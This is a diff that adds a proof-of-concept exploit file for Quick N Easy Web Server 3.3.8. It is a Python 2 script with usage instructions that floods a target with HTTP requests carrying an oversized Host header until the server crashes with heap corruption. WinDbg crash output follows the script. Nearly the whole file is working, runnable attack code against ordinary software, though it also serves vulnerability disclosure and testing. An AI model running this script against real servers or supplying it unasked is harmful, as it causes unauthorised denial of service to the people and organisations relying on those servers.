@@ -1,0 +1,89 @@
+# Title: Quick N Easy Web Server 3.3.8 - Denial of Service (PoC)
+# Date: 2019-12-25
+# Author: Cody Winkler
+# Vendor Homepage: https://www.pablosoftwaresolutions.com/
+# Software Link: https://www.pablosoftwaresolutions.com/html/quick__n_easy_web_server.html
+# Version: <= 3.3.8
+# Tested on: Windows 10 x64 (wow64)
+# CVE: N/A
+
+#!/usr/bin/env python
+"""
+Remote Unauthenticated Heap Memory Corruption in Quick N' Easy Web Server <= 3.3.8
+
+[+] Usage: python quickwww_heap338.py <IP> <PORT>
+
+$ python exploit.py 127.0.0.1 80
+"""
+
+from __future__ import print_function
+import socket
+import sys
+import re
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+crashed = r'(503 Service Unavailable)'
+
+http_req = "GET / HTTP/1.1\r\n"
+http_req += "Host: " + "A"*15000 + "\r\n" # 50000 A's causes an interesting double free in OLEAUT32!VariantClear() when attached to debugger
+http_req += "User-Agent: A\r\n"
+http_req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+http_req += "Accept-Language: en-US,en;q=0.5\r\n"
+http_req += "Cookie: A\r\n"
+http_req += "Connection: Close\r\n"
+http_req += "Upgrade-Insecure-Requests: 0\r\n"
+http_req += "Cache-control: max-age=0\r\n\r\n"
+
+def main():
+
+    print("[+] Remote Heap Memory Corruption in Quick n Easy Web Server <= 3.3.8")
+    i = 1
+    while( i < 1500):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, port))
+            s.send(http_req)
+            print("[+] Spraying heap with %d 5000-byte requests" % i, end='\r')
+            sys.stdout.flush()
+            if re.search(crashed, s.recv(1024)):
+                print(" "*50)
+                print("[+] Threads have exited BAADF00D with %d requests!" % i)
+                s.close()
+                exit()
+            s.close()
+            i = i+1
+        except Exception, msg:
+            print("[-] Something went wrong :(")
+            print(msg)
+
+main()
+
+"""
+0:010> kb7
+ # ChildEBP RetAddr  Args to Child              
+00 06bbf4d4 77ebc1f5 77df50e4 8ae27015 01471640 ntdll!RtlpValidateHeapEntry+0x61114
+01 06bbf51c 77e6b325 06bc0048 01471640 772e0f80 ntdll!RtlDebugSizeHeap+0xb3
+02 06bbf53c 772e0f9b 013b0000 00000000 06bc0048 ntdll!RtlSizeHeap+0x45775
+03 06bbf550 76640be7 773fcf44 06bc0048 00000008 combase!CRetailMalloc_GetSize+0x1b [onecore\com\combase\class\memapi.cxx @ 702] 
+04 06bbf574 766408cd 06bc0048 01471760 00451f4c OLEAUT32!APP_DATA::FreeCachedMem+0x37
+05 06bbf5a8 0041ec27 06bbf5bc 05ec4fe4 05ec4f50 OLEAUT32!VariantClear+0x20d
+WARNING: Stack unwind information not available. Following frames may be wrong.
+06 06bbf5c4 766408cd 76cd0008 0907a724 01471254 quickweb+0x1ec27
+
+0:010> !analyze -v
+<SNIP>
+STACK_TEXT:  
+00000000 00000000 heap_corruption!quickweb.exe+0x0
+SYMBOL_NAME:  heap_corruption!quickweb.exe
+MODULE_NAME: heap_corruption
+IMAGE_NAME:  heap_corruption
+STACK_COMMAND:  ** Pseudo Context ** ManagedPseudo ** Value: 7ba5870 ** ; kb
+FAILURE_BUCKET_ID:  HEAP_CORRUPTION_80000003_heap_corruption!quickweb.exe
+OS_VERSION:  10.0.17763.1
+BUILDLAB_STR:  rs5_release
+OSPLATFORM_TYPE:  x86
+OSNAME:  Windows 10
+FAILURE_ID_HASH:  {68efeb37-77bb-f968-fc16-9a1fba88436f}
+"""
